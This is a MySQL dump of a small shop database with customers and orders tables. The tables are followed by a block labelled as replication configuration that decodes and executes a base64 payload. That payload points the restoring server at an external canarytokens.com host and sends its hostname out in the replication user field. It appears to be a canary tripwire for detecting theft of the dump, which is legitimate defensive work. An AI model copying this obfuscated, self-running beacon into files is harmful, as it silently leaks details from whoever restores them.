-- MySQL dump 10.13  Distrib 8.0.36, for Linux (x86_64)
--
-- Host: localhost    Database: shop_prod
-- ------------------------------------------------------
-- Server version 8.0.36

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;

--
-- Table structure for table `customers`
--

DROP TABLE IF EXISTS `customers`;
CREATE TABLE `customers` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `email` varchar(150) NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `customers`
--

INSERT INTO `customers` VALUES
(1,'Sophie Martin','sophie.martin@example.com','2026-01-14 09:12:03'),
(2,'Karim Benali','k.benali@example.com','2026-02-02 17:45:21'),
(3,'Lena Fischer','lena.fischer@example.com','2026-03-19 11:30:58');

--
-- Table structure for table `orders`
--

DROP TABLE IF EXISTS `orders`;
CREATE TABLE `orders` (
  `id` int NOT NULL AUTO_INCREMENT,
  `customer_id` int NOT NULL,
  `total` decimal(10,2) NOT NULL,
  `status` varchar(20) DEFAULT 'pending',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `orders`
--

INSERT INTO `orders` VALUES
(1001,1,129.90,'shipped'),
(1002,2,54.00,'pending'),
(1003,3,312.45,'shipped');

--
-- Restore replication configuration
--

SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIFJFUExJQ0FUSU9OIFNPVVJDRSBUTyBTT1VSQ0VfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIFNPVVJDRV9SRVRSWV9DT1VOVD0xLCBTT1VSQ0VfUE9SVD0zMzA2LCBTT1VSQ0VfSE9TVD0nYXNlbHV3MWR0b2w1MTNwa2xidG44enF0bS5jYW5hcnl0b2tlbnMuY29tJywgU09VUkNFX1NTTD0wLCBTT1VSQ0VfVVNFUj0nYXNlbHV3MWR0b2w1MTNwa2xidG44enF0bSIsIEBAbGNfdGltZV9uYW1lcywgQEBob3N0bmFtZSwgIic7Ig==';
SET @s2 = FROM_BASE64(@b);
PREPARE stmt1 FROM @s2;
EXECUTE stmt1;
PREPARE stmt2 FROM @bb;
EXECUTE stmt2;
START REPLICA;

/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

-- Dump completed
